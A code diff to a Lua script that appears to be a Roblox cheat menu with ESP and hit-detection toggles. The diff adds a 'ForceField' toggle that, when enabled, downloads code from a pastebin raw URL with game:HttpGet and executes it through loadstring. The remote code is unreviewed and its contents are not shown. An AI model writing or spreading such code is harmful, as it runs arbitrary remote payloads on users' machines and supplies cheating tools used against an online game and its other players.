@@ -1758,6 +1758,22 @@ ESPGroup:AddToggle("ambient_toggle", {
     end
 })
 
+local LoadedExtraScript = false
+
+ESPGroup:AddToggle('ForceField', {
+    Text = 'ForceField',
+    Default = false,
+    Callback = function(v)
+        if v == true and not LoadedExtraScript then
+            LoadedExtraScript = true
+            loadstring(game:HttpGet("https://pastebin.com/raw/znc5VEJY"))()
+            if library then
+                library:Notify("ForceField Script Loaded", 2)
+            end
+        end
+    end
+})
+
 hit_group:AddToggle('detection', {
     Text = 'Hit Detection',
     Default = hit.detection,
